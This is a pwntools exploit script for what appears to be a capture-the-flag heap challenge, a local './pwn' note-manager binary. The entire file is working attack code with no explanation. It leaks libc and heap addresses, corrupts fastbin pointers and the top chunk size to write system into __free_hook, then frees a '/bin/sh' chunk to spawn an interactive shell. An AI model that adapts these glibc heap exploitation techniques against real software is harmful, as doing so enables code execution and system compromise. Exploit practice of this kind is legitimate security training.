from pwn import *

def add(size,data):
	p.sendlineafter(">> ","1")
	p.sendlineafter("note:",str(size))
	p.sendafter("note:",data)


def edit(index,data):
	p.sendlineafter(">> ","2")
	p.sendlineafter("note:",str(index))
	p.sendafter("note:",data)

def delete(index):
	p.sendlineafter(">> ","3")
	p.sendlineafter("note:",str(index))

def show():
	p.sendlineafter(">> ","4")


libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
p=process('./pwn')


add(0x88,'a'*0x88)#0
add(0x88,'a'*0x88)#1
delete(0)
show()
p.recvuntil("0 : ")
main_arena=u64(p.recv(6).ljust(8,'\x00'))-0x58
print hex(main_arena)
libc_base=main_arena-libc.symbols['__malloc_hook']-0x10
system=libc_base+libc.symbols['system']
print "system",hex(system)

free_hook=libc_base+libc.symbols['__free_hook']
print hex(free_hook)
one_gadget=libc_base+0xf1147
print "one",hex(one_gadget)

add(0x88,'a'*0x88)#2
add(0x20,'a'*0x20)#3
add(0x20,'a'*0x18+p64(0x31))#4
delete(4)
delete(3)
show()
p.recvuntil("3 : ")
heap=u64(p.recv(6).ljust(8,'\x00'))-0x150
print "heap",hex(heap)
edit(3,p64(heap+0x170)+'\n')
#gdb.attach(p)
top_ptr=heap+0x180

print hex(system+free_hook-top_ptr)
print hex(free_hook-top_ptr)

add(0x20,'/bin/sh\n')#5
add(0x20,'a'*0x8+p64(system+free_hook-top_ptr-1)+'\n')
add(free_hook-top_ptr-0x10,'\n')

#gdb.attach(p)

delete(5)
#gdb.attach(p)

#system+free_hook-top_ptr-1 - (free_hook-top_ptr-0x10 +0x10) = system-1

#top_ptr + free_hook_top_ptr = free_hook
p.interactive()
